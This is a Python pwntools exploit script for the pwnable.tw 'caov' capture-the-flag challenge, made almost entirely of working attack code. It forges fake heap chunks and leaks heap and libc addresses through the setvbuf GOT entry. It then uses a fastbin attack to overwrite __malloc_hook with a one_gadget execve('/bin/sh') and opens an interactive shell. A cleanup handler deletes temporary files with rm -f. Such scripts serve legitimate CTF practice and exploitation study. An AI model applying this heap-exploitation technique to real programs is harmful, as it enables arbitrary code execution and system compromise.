#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './caov.debug'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('chall.pwnable.tw', 10306)
elf = ELF(execve_file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Edit(name, length, key):
    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('Enter your name: ', name)
    sh.sendlineafter('New key length: ', str(length))
    if(key):
        sh.sendlineafter('Key: ', key)
        sh.sendlineafter('Value: ', '1')

# name_addr = 0x6032C0
name_addr = elf.symbols['name']

sh.sendlineafter('Enter your name: ', 'aa')
sh.sendlineafter('Please input a key: ', '\0' + 'b' * 0x36)
sh.sendlineafter('Please input a value: ', '1')

Edit(p64(0) + p64(0x21) + p64(0) + p64(0) + p64(0) + p64(0x21) + 'a' * 0x30 + p64(name_addr + 0x10), 0x17, 'a' + 'a' * 0x16)
Edit(p64(0) + p64(0x41) + p64(0) * 7 + p64(0x21) + 'c' * 0x10 + p64(name_addr + 0x10), 0, None)

sh.recvuntil('Your data info after editing:\nKey: ')
result = sh.recvline()[:-1]
heap_addr = u64(result.ljust(8, '\0'))
log.success('heap_addr: ' + hex(heap_addr))

D_chunk_addr = heap_addr + 0x40

# pause()
Edit(p64(0) + p64(0x41) + p64(D_chunk_addr) + p64(0) * 6 + p64(0x21) + 'c' * 0x10 + p64(0) , 0x37, '\0')
# pause()
Edit(p64(0) + p64(0x41) + p64(D_chunk_addr) + p64(0) * 6 + p64(0x21) + 'c' * 0x10 + p64(0) , 0x37, p64(elf.got['setvbuf']))

sh.recvuntil('Your data info after editing:\nKey: ')
result = sh.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['setvbuf']
log.success('libc_addr: ' + hex(libc_addr))

main_arena_addr = libc_addr + libc.symbols['__malloc_hook'] + 0x10
log.success('main_arena_addr: ' + hex(main_arena_addr))

Edit(p64(0) + p64(0x71) + 'x' * 0x50 + p64(name_addr + 0x10) + p64(0) + p64(0) + p64(21) , 0, None)
Edit(p64(0) + p64(0x71) + p64(main_arena_addr - 0x33) + 'x' * 0x48 + p64(0) + p64(0) + p64(0) + p64(21) , 0x67, '\0')

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
# pause()
Edit('\0' * 150 , 0x67, 'z' * 0xb + p64(libc_addr + 0xef9f4) + p64(libc_addr + 0xef6c4))


sh.interactive()
clear()

